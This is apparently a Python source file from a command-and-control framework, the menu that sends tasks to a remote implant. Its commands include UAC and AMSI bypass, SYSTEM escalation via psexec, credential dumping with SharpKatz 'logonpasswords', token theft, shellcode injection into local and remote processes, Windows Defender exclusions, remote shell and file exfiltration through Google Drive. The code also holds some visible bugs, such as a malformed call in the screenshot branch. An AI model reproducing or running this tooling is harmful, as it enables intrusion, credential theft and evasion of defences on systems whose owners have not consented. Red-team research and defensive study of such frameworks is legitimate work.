import os
import re
# import readline
from colorama import Fore
# import Graphic.Help
import Internals.Http_Delete
import Internals.Http_Get
import Internals.Http_Post
import Internals.File_Interaction
import Internals.Upload_Download
# import Internals.GoogleAPI.API
# import Menu.Modules.ActiveDirectory
import Utilities.constant as const
from Services.Auto_Complete import MyCompleter
# import Internals.GoogleAPI.API

Completer_take_control = MyCompleter(
    ["ls", "cd", "mkdir", "rmdir", "rmf", "ps", "whoami", "pwd", "rev2self",
     "bypass-uac", "bypass-amsi", "screenshot", "scan-port",
     "scan-host", "run", "run-ui", "hashdump", "search", "search file", "search ext", "search text",
     "load ActiveDirectory", "defender-exclusion", "getsystem",
     "shell", "download-gd", "upload-gd", "upload", "download", "make-token", "steal-token", "execute-assembly",
     "self-shinject", "remote-shinject", "spawn-shinject", "help", "clear", "return"])


def take_control_menu(implant_id,selection):
        task_id  = ""
        split_selection = selection.split(" ")
        command = split_selection[0]

        # List Directory
        if command == "kill":
            Internals.Http_Delete.delete_implant(implant_id)


        # List Directory
        elif command == "ls":
            try:
                task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, split_selection[1], implant_id)

            # Because "ls" can take also no args
            except:
                task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # Change Directory
        elif command == "cd":
            task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, " ".join(split_selection[1:]), implant_id)

        # Create Directory
        elif command == "mkdir":
            task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, " ".join(split_selection[1:]), implant_id)


        # Remove Directory
        elif command == "rmdir":
            task_id  = Internals.Http_Post.send_cmd_multiple_args_task_to_implant(command, " ".join(split_selection[1:-1]),split_selection[-1], implant_id)

        # Remove File
        elif command == "rmf":
            task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, " ".join(split_selection[1:]), implant_id)

        # Get Process
        elif command == "ps":
            task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # whoami
        elif command == "whoami":
            task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # pwd
        elif command == "pwd":
            task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # rev2self
        elif command == "rev2self":
            task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # Get system
        elif selection == str("getsystem psexec"):
            task_id  = Internals.Http_Post.send_all_param_task_to_implant(command, selection[10:],Internals.File_Interaction.encode(const.TOOLS_FOLDER + "psexec.exe"),implant_id)

        elif selection == "getsystem task":
            task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, "task", implant_id)

        # bypass-uac
        elif command == "bypass-uac":
            task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # bypass-amsi
        elif command == "bypass-amsi":
            task_id  = Internals.Http_Post.send_simple_task_to_implant(selection, implant_id)

        # getSystem
        elif command == "screenshot":
            task_id .Http_Post.send_cmd_args_task_to_implant(command, None, implant_id)
            file_content = Internals.Http_Get.get_file_b64_byte_content(implant_id, task_id)

            if str(file_content).__contains__("[!] Error: "):
                const.warning_message("File size is to huge, please use download-gd")

            else:
                Internals.File_Interaction.write_file_byte(file_content)

        # Scanning Port
        elif command == "scan-port":
            task_id  = Internals.Http_Post.send_cmd_multiple_args_task_to_implant(command, split_selection[1], split_selection[2],implant_id)


        # Scanning Host
        elif command.__contains__("scan-host"):
            task_id  = Internals.Http_Post.send_cmd_multiple_args_task_to_implant(command, split_selection[1], split_selection[2],implant_id)

        # Run external binary
        elif command == "run":
            path_args = selection[4:]

            try:
                arg = re.findall(r'"(.*?)"', path_args)[0]
                path = path_args.replace(arg, "")[0:-3]

            except:
                arg = ""
                path = path_args.replace(arg, "")

            task_id  = Internals.Http_Post.send_cmd_multiple_args_task_to_implant(command, path, arg, implant_id)

        # Run external binary
        elif command == "run-ui":
            path_args = selection[7:]

            try:
                arg = re.findall(r'"(.*?)"', path_args)[0]
                path = path_args.replace(arg, "")[0:-3]

            except:
                arg = ""
                path = path_args.replace(arg, "")

            task_id  = Internals.Http_Post.send_cmd_multiple_args_task_to_implant(command, path, arg, implant_id)

        # shell
        elif command == "shell":
            try:
                task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, " ".join(split_selection[1:]),implant_id)
            except:
                const.error_message("Error: shell need {args} to work")

        # download file trough Google Drive
        elif command == "download-gd":
            if len(selection[12:]) == 0:
                const.error_message("Error: upload need {file} path to work")

            else:
                result = Internals.Http_Get.get_output_google_drive_download(implant_id,
                                                                             Internals.Http_Post.send_cmd_args_task_to_implant(
                                                                                 command, selection[12:], implant_id))

                if "[!]" not in str(result):
                    if Internals.GoogleAPI.API.check_token_api_file():
                        google_drive = Internals.GoogleAPI.API.DriveAPI()
                        google_drive.download_file(str(result).split("\\")[-1])

                    else:
                        const.warning_message("Google API File Token not existing in Resources folder")



                else:
                    print(result)

        # upload file trough Google Drive
        elif command == "upload-gd":
            if len(selection[10:]) == 0:
                const.error_message("Error: upload need {file} path to work")

            else:
                if Internals.GoogleAPI.API.check_token_api_file():
                    google_drive = Internals.GoogleAPI.API.DriveAPI()
                    google_drive.upload_file(selection[10:])

                    task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, selection[10:], implant_id)

                else:
                    const.warning_message("Google API File Token not existing in Resources folder")

        # Native & Primitive  File
        elif command == "upload":
            if len(selection[7:]) == 0:
                const.error_message("Error: upload need {file} path to work")

            else:
                Internals.Upload_Download.upload_file(selection[7:], implant_id, command)

        # Native & Primitive Download File
        elif command == "download":
            if len(selection[9:]) == 0:
                const.error_message("Error: upload need {file} path to work")

            else:
                Internals.Upload_Download.download_file(selection[9:], implant_id, command)

        # Make Token Impersonate Token
        elif command == "make-token":
            try:
                task_id  = Internals.Http_Post.send_cmd_multiple_args_task_to_implant(command, split_selection[1]," ".join(split_selection[2:]), implant_id)
            except:
                const.error_message("Error: make-token need {args, args} to work, eg: make-token make-token "
                                    "DOMAIN\\USERNAME, PASSWORD")

        # Steal Token
        elif command == "steal-token":
            try:
                task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, split_selection[1], implant_id)
            except:
                const.error_message("Error: steal-token need {args} to work, eg: steal-token 1865")

        # Execute Assembly Code Binary To Base64
        elif command.__contains__("execute-assembly"):
            try:
                tt_args = " ".join(split_selection[2:])
                task_id  = Internals.Http_Post.send_all_param_task_to_implant(split_selection[0], tt_args,Internals.File_Interaction.encode(split_selection[1]),implant_id)
            except Exception as e:
                const.error_message("Error:"), e

        # self-shinject inject shell into current thread
        elif command == "self-shinject":
            try:
                task_id  = Internals.Http_Post.send_all_param_task_to_implant(command, None, Internals.File_Interaction.encode(selection[14:]),implant_id)
            except Exception as e:
                const.error_exception("Error:", e)

        # remote - shinject
        elif command == "remote-shinject":
            try:
                task_id  = Internals.Http_Post.send_all_param_task_to_implant(command, split_selection[1],Internals.File_Interaction.encode(split_selection[2]),implant_id)
            except Exception as e:
                const.error_exception("Error:", e)

        # spawn-shinject
        elif command == "spawn-shinject":
            try:
                task_id  = Internals.Http_Post.send_all_param_task_to_implant(command, None, Internals.File_Interaction.encode(selection[15:]),implant_id)

            except Exception as e:
                const.error_exception("Error:", e)

        # Windows Defender Exclusion
        elif command == "defender-exclusion":
            try:
                args = split_selection[1]
                task_id  = Internals.Http_Post.send_cmd_args_task_to_implant(command, args, implant_id)
            except:
                const.error_message("Error: defender-exclusion need {args} to work")

        # HashDump
        elif command == "hashdump":
            arguments = "--Command logonpasswords"

            task_id  = Internals.Http_Post.send_all_param_task_to_implant("execute-assembly", arguments,Internals.File_Interaction.encode(const.TOOLS_FOLDER + "SharpKatz.exe"), implant_id)

        # search
        elif command == "search":

            try:
                if split_selection[1] == "file":

                    path_args = selection[12:]
                    file = re.findall(r'"(.*?)"', path_args)[0]
                    path = path_args.replace(file, "")[3:]

                    task_id  = Internals.Http_Post.send_cmd_three_args_task_to_implant(split_selection[0], split_selection[1],file, path,implant_id)

                elif split_selection[1] == "ext":
                    path = " ".join(split_selection[3:])

                    task_id  = Internals.Http_Post.send_cmd_three_args_task_to_implant(split_selection[0], split_selection[1],split_selection[2], path,implant_id)

                elif split_selection[1] == "text":

                    path_args = selection[12:]
                    text = re.findall(r'"(.*?)"', path_args)[0]
                    path = path_args.replace(text, "")[3:]

                    task_id  = Internals.Http_Post.send_cmd_three_args_task_to_implant(split_selection[0], split_selection[1],text, path,implant_id)

            except:
                const.error_message("Error: search need {type} {args} to work")

        return task_id
        #
        # #### MODULE ####
        # elif command == "load":
        #     try:
        #         if command == "load" and split_selection[1] == "ActiveDirectory":
        #             Menu.Modules.ActiveDirectory.main(implant_id)
        #     except:
        #         const.error_message("Error: load take {args} to work")
        #
        # #### MODULE ####
        #
        # # Get command line help
        # elif selection.__contains__("help"):
        #     if selection == "help":
        #         Graphic.Help.take_control_help()
        #     else:
        #         Graphic.Help.take_control_help_more_detail(split_selection[1])
        #
        # elif selection == "clear":
        #     os.system("cls")
        #
        # # Return to previous menu
        # elif selection == "return":
        #     break
        #
        # # Error
        # else:
        #     const.error_message("Error: Input Not Handle")
